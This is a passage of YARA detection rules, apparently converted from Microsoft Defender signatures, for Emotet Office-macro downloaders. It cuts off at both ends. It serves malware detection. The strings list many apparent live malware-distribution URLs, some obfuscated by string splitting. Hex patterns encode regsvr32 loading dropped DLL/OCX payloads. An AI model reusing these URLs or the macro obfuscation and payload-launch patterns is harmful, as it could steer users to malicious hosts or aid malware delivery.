        $x_1_4 = "://hippocrates-poetry.org/10th-annual-hippocrates/uS0IeOAAuoQ7NP9cm/" ascii //weight: 1
        $x_1_5 = "://cabinetcecaf.com/wp-admin/DhqUy/" ascii //weight: 1
        $x_1_6 = "://digidist.com/y3/PfakjJB/" ascii //weight: 1
        $x_1_7 = "://cloud-ci.online/backup/dBsIP/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PKSS_2147814603_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PKSS!MTB"
        threat_id = "2147814603"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 77 77 2e 61 67 72 65 74 74 6f 2e 63 6f 6d 2f 54 65 6d 70 6c 61 74 65 2f [0-32] 2f 22 2c 22}  //weight: 1, accuracy: Low
        $x_1_2 = {77 77 77 2e 61 67 6e 65 73 6c 65 75 6e 67 2e 63 6f 6d 2f 72 61 77 2e 62 61 63 6b 75 70 2f [0-32] 2f 22 2c 22}  //weight: 1, accuracy: Low
        $x_1_3 = {6c 69 66 65 62 6f 74 6c 2e 63 6f 6d 2f 52 65 73 70 6f 6e 73 65 2f [0-32] 2f 22 2c 22}  //weight: 1, accuracy: Low
        $x_1_4 = {6c 69 76 65 6a 61 67 61 74 2e 63 6f 6d 2f 68 2f [0-32] 2f}  //weight: 1, accuracy: Low
        $x_1_5 = {31 38 35 2e 31 38 37 2e 37 30 2e 33 35 2f 77 6f 72 64 70 72 65 73 73 5f 62 6f 2f [0-32] 2f 22 2c 22}  //weight: 1, accuracy: Low
        $x_1_6 = {31 38 38 2e 31 36 36 2e 32 34 35 2e 31 31 32 2f 73 69 70 61 64 75 2f [0-32] 2f 22 2c 22}  //weight: 1, accuracy: Low
        $x_1_7 = {31 30 33 2e 38 35 2e 39 35 2e 35 2f 76 31 2f 75 70 6c 6f 61 64 73 2f [0-32] 2f 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDW_2147814664_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDW!MTB"
        threat_id = "2147814664"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://centrobilinguelospinos.com/wp-admin/VrgzWT/" ascii //weight: 1
        $x_1_2 = "://boardingschoolsoftware.com/backup/CtMR5Yi/" ascii //weight: 1
        $x_1_3 = "://bsa.iain-jember.ac.id/asset/x0hMwOPVpkQSNoS8WCN/" ascii //weight: 1
        $x_1_4 = "://ctha.uy/cgi-bin/zGhvZLq6kSV1L1Vi/" ascii //weight: 1
        $x_1_5 = "://descontador.com.br/css/q5nrG6ua/" ascii //weight: 1
        $x_1_6 = "://letea.eu/wp-content/3GgF4miFZTq9/" ascii //weight: 1
        $x_1_7 = "://quoctoan.c1.biz/wp-admin/j8Zu/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDX_2147814669_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDX!MTB"
        threat_id = "2147814669"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-3] 5c 57 69 6e 64 6f 77 73 5c [0-3] 53 79 73 57 6f 77 36 34 5c [0-15] 5c 65 6e 2e 6f 63 78}  //weight: 1, accuracy: Low
        $x_1_2 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-3] 53 79 73 57 6f 77 36 34 5c [0-15] 22 4a 4a 43 43 42 42 22 [0-6] 5c 77 6e 2e 6f 63 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDY_2147814752_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDY!MTB"
        threat_id = "2147814752"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://api.zmotpro.com/totalenvironment/logs/8wdgNaq0x/" ascii //weight: 1
        $x_1_2 = "://aetoaluminium.com/wp-admin/gkqyKlzXoc/" ascii //weight: 1
        $x_1_3 = "://24studypoint.com/wp-admin/3uEUtb/" ascii //weight: 1
        $x_1_4 = "://baicc-ct.org/wp-admin/IwhcfC2sdxoToa/" ascii //weight: 1
        $x_1_5 = "://mustknew.com/lovecalculator/osDBhPqx0tB1Vtp/" ascii //weight: 1
        $x_1_6 = "://kiski023.com/wp-includes/Requests/Cookie/C/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDZ_2147814782_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDZ!MTB"
        threat_id = "2147814782"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 79 73 57 6f 77 36 34 5c [0-5] 5c 57 69 6e 64 6f 77 73 5c [0-31] 5c 72 64 73 2e 6f 63 78 [0-6] 5c 72 64 73 2e 6f 63 78 [0-5] 72 22 26 22 65 67 22 26 22 73 76 22 26 22 72 33 22 26 22 32 2e 65 22 26 22 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_APD_2147814791_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.APD!MTB"
        threat_id = "2147814791"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://w\"&\"w\"&\"w.bsa\"&\"gro\"&\"u\"&\"p.c\"&\"o\"&\"m.b\"&\"r/cat.p\"&\"h\"&\"p" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SGS_2147814794_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SGS!MTB"
        threat_id = "2147814794"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "..\"h\"&\"tt\"&\"ps://as\"&\"ervon.c\"&\"o\"&\"m/css/Dha\"&\"DF\"&\"9VHo\"&\"ru\"&\"7/\",\"U.." ascii //weight: 1
        $x_1_2 = "\"ht\"&\"tps://w\"&\"w\"&\"w.hih7.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/nX8\"&\"WbaR\"&\"CZV\"&\"yV\"&\"Xi/\",\"M.." ascii //weight: 1
        $x_1_3 = "\"h\"&\"ttp\"&\"s://af\"&\"riv\"&\"a\"&\"c.o\"&\"r\"&\"g/cs\"&\"s/sZq\"&\"qu3\"&\"mY\"&\"VH\"&\"FK/\",\"9.." ascii //weight: 1
        $x_1_4 = "\"h\"&\"ttp\"&\"s://a-u-s.i\"&\"t/qL\"&\"oyJJF\"&\"V0\"&\"q6Z\"&\"2i/\",\"7.." ascii //weight: 1
        $x_1_5 = "\"ht\"&\"tp\"&\"s://act\"&\"we\"&\"ll.fr/l\"&\"og\"&\"s/g2x\"&\"yR/\",\"c.." ascii //weight: 1
        $x_1_6 = "\"h\"&\"ttps://w\"&\"ww.ac\"&\"tiv-s\"&\"hoes.r\"&\"o/w\"&\"p-inc\"&\"lud\"&\"es/7\"&\"Ob1\"&\"hpW\"&\"vAnp\"&\"R2f\"&\"K4/\",\"O.." ascii //weight: 1
        $x_1_7 = "\"h\"&\"ttps://getl\"&\"ivet\"&\"ext.c\"&\"o\"&\"m/w\"&\"p-a\"&\"d\"&\"min/6Z\"&\"sA\"&\"Nn\"&\"00/\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BPD_2147814805_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BPD!MTB"
        threat_id = "2147814805"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-15] 53 79 73 57 6f 77 36 34 [0-6] 57 69 6e 64 6f 77 73 [0-31] 5c 72 64 73 2e 6f 63 78 [0-6] 5c 72 64 73 2e 6f 63 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_CPD_2147814830_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.CPD!MTB"
        threat_id = "2147814830"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-15] 53 79 73 57 6f 77 36 34 [0-6] 57 69 6e 64 6f 77 73 [0-64] 5c 66 62 64 2e 64 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_DPD_2147814941_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.DPD!MTB"
        threat_id = "2147814941"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 79 73 57 6f 77 36 34 [0-6] 5c 57 69 6e 64 6f 77 73 [0-31] 5c 75 6a 67 2e 64 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EPD_2147815033_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EPD!MTB"
        threat_id = "2147815033"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.alejandrovillar.com/MSL/eKDWjpa4OHRxpysOTFe/" ascii //weight: 1
        $x_1_2 = "://alejandrastamateas.com/web/ZxA3zHwsH3r/" ascii //weight: 1
        $x_1_3 = "://alexetaurore.com/wanted/pfFtzaJovICU81kfuUp/" ascii //weight: 1
        $x_1_4 = "://ayursoukhya.org/wp-includes/XI35qPGHvszZ1u/" ascii //weight: 1
        $x_1_5 = "://balibuli.hu/cgi-bin/WDDM0VHSK4VcOFmU/" ascii //weight: 1
        $x_1_6 = "://aldibiki.com/prettyPhoto/gLFRzQV0VunO/" ascii //weight: 1
        $x_1_7 = "://al-brik.com/vb-w/U/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_GPD_2147815034_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GPD!MTB"
        threat_id = "2147815034"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 79 73 57 6f 77 36 34 [0-8] 5c 72 66 73 2e 64 6c 6c [0-6] 57 69 6e 64 6f 77 73 [0-31] 72 66 73 2e 64 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDF_2147815043_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDF!MTB"
        threat_id = "2147815043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 68 22 26 22 74 74 70 [0-255] 2e [0-15] 22 2c 22 [0-10] 22 68 74 22 26 22 74 70 [0-255] 2e 01 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDF_2147815043_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDF!MTB"
        threat_id = "2147815043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 68 22 26 22 74 74 70 [0-255] 2e [0-15] 22 2c 22 [0-10] 22 68 22 26 22 74 74 22 26 22 70 [0-255] 2e 01 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDF_2147815043_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDF!MTB"
        threat_id = "2147815043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-95] 22 37 37 37 37 22 2c 22 [0-10] 52 45 54 55 52 4e [0-10] 5c 65 66 68 6a 2e 64 6c 6c [0-10] 5c 65 66 68 6a 2e 64 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDF_2147815043_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDF!MTB"
        threat_id = "2147815043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-95] 22 37 37 37 37 22 2c 22 [0-10] 52 45 54 55 52 4e}  //weight: 1, accuracy: Low
        $x_1_2 = {5c 75 72 74 6a 2e 64 6c 6c [0-10] 5c 75 72 74 6a 2e 64 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDF_2147815043_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDF!MTB"
        threat_id = "2147815043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 22 26 22 65 67 22 26 22 73 76 22 26 22 72 33 22 26 22 32 2e 65 22 26 22 78 22 26 22 65 [0-10] 5c 57 22 26 22 69 6e 22 26 22 64 6f 22 26 22 77 22 26 22 73 5c [0-10] 53 79 22 26 22 73 22 26 22 57 6f 22 26 22 77 22 26 22 36 34 5c [0-95] 2f 22 2c 22 [0-95] 2f 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDF_2147815043_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDF!MTB"
        threat_id = "2147815043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-10] 53 79 73 57 6f 77 36 34 5c [0-10] 5c 57 69 6e 64 6f 77 73 5c [0-10] 2c 30 2c [0-10] 2c 30 2c 30 29 [0-47] 22 68 22 26 22 74 74 22 26 22 70 [0-159] 22 2c 22 [0-10] 22 68 22 26 22 74 74 22 26 22 70 [0-159] 22 2c 22 [0-10] 22 68 22 26 22 74 74 22 26 22 70}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDF_2147815043_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDF!MTB"
        threat_id = "2147815043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 22 26 22 65 67 22 26 22 73 76 22 26 22 72 33 22 26 22 32 2e 65 22 26 22 78 22 26 22 65 [0-10] 5c 57 22 26 22 69 6e 22 26 22 64 6f 22 26 22 77 22 26 22 73 5c [0-10] 53 79 22 26 22 73 22 26 22 57 6f 22 26 22 77 22 26 22 36 34 5c 29 [0-10] 77 22 26 22 77 77 2e [0-95] 2f 22 2c 22 [0-10] 77 22 26 22 77 77 2e [0-95] 2f 22 2c 22 [0-10] 77 22 26 22 77 77 2e [0-95] 2f 22 2c 22 [0-10] 77 22 26 22 77 77 2e [0-95] 2f 22 2c 22 [0-10] 77 22 26 22 77 77 2e [0-95] 22 2c 22 2f [0-10] 77 22 26 22 77 77 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_HPD_2147815061_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.HPD!MTB"
        threat_id = "2147815061"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 66 73 2e 64 6c 6c [0-32] 72 22 26 22 65 67 22 26 22 73 22 26 22 76 72 33 22 26 22 32 2e 65 22 26 22 78 22 26 22 65 [0-6] 57 22 26 22 69 6e 64 22 26 22 6f 22 26 22 77 22 26 22 73 [0-6] 53 22 26 22 79 73 57 22 26 22 6f 77 22 26 22 36 34}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_IPD_2147815064_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.IPD!MTB"
        threat_id = "2147815064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://bulldogironworksllc.com/temp/r8YAI2o98o4j0UPn/" ascii //weight: 1
        $x_1_2 = "://brucemulkey.com/wp-admin/XGXUrF2z0I/" ascii //weight: 1
        $x_1_3 = "://www.buddymorel.com/cdar/3Egg7sUHTTd8kSrFj/" ascii //weight: 1
        $x_1_4 = "://altunyapiinsaat.com/datyusdtyuastbgdasg-23/vKckKhX11LJ/" ascii //weight: 1
        $x_1_5 = "://brendancleary.net/code_playground/e3ZqQ5WzPBq/" ascii //weight: 1
        $x_1_6 = "://www.borjalnoor.com/engine1/MHH/" ascii //weight: 1
        $x_1_7 = "://bozzline.com/cp/SGOwQkA00x5Ixe14e/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_JPD_2147815129_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.JPD!MTB"
        threat_id = "2147815129"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6b 79 74 6b 2e 64 6c 6c [0-8] 5c 6b 79 74 6b 2e 64 6c 6c [0-5] 72 22 26 22 65 67 22 26 22 73 76 22 26 22 72 33 22 26 22 32 2e 65 78 65 [0-5] 5c 57 22 26 22 69 22 26 22 6e 64 6f 22 26 22 77 73 5c [0-5] 53 79 73 22 26 22 57 6f 77 22 26 22 36 34}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_KPD_2147815139_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.KPD!MTB"
        threat_id = "2147815139"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://osmani.atwebpages.com/wp-content/Ynwrr/" ascii //weight: 1
        $x_1_2 = "://50-50aravidis.gr/thesi/wmL/" ascii //weight: 1
        $x_1_3 = "://amplamaisbeneficios.com.br/contratos/MWnnZG/" ascii //weight: 1
        $x_1_4 = "://bcingenieria.es/phpmailer/Z7fmcI7Va/" ascii //weight: 1
        $x_1_5 = "://bredabeeld.nl/OLD/eavGp2KOdwXT/" ascii //weight: 1
        $x_1_6 = "://www.cagataygunes.com.tr/stylesheets/uqK4kfhG4RAuRIA2/" ascii //weight: 1
        $x_1_7 = "://kogelvanger.nl/picture_library/1MNqKan2FhWtQg5Uacu/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_LPD_2147815183_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.LPD!MTB"
        threat_id = "2147815183"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://canismallorca.es/wp-admin/OTyeYrx9C9BvYvVb3/" ascii //weight: 1
        $x_1_2 = "://capslock.co.za/wp-includes/LMngUUTuanBofr5zK/" ascii //weight: 1
        $x_1_3 = "://www.cafe-kwebbel.nl/layouts/3Wkev/" ascii //weight: 1
        $x_1_4 = "://bkps.ac.th/b91-std63/Ixv52m8gu4aaUiyb/" ascii //weight: 1
        $x_1_5 = "://borbajardinagem.com.br/erros/vlB3f6XpsZG/" ascii //weight: 1
        $x_1_6 = "://www.best-design.gr/_errorpages/9wCa7GLI0cl6nM/" ascii //weight: 1
        $x_1_7 = "://belleile-do.fr/diapo-ile/EeBHyfGoKYACY/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDEG_2147815219_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDEG!MTB"
        threat_id = "2147815219"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://subbalakshmi.com/data_winning/kYv6xb/" ascii //weight: 1
        $x_1_2 = "://webhoanggia.com/wp-admin/r6f3vv8ukiZjeW/" ascii //weight: 1
        $x_1_3 = "://www.controlnetworks.com.au/wp-content/Pgb43ikTIobH/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_GGPD_2147815248_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GGPD!MTB"
        threat_id = "2147815248"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://casache.com/web/n3jxwXXwa/" ascii //weight: 1
        $x_1_2 = "://www.blessingsource.com/blessingsource.com/rFQ0Ip6lQXXK/" ascii //weight: 1
        $x_1_3 = "://ccalaire.com/wp-admin/d1pGRa0X/" ascii //weight: 1
        $x_1_4 = "://cdimprintpr.com/brochure2/A9NmYDndZ/" ascii //weight: 1
        $x_1_5 = "://careerplan.host20.uk/images/Ls/" ascii //weight: 1
        $x_1_6 = "://ausnz.net/2010wc/odSi5tQKkCIXEWl9/" ascii //weight: 1
        $x_1_7 = "://azsiacenter.com/js/sOhmiosLJOgwaP6i5nln/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_MPD_2147815278_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.MPD!MTB"
        threat_id = "2147815278"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
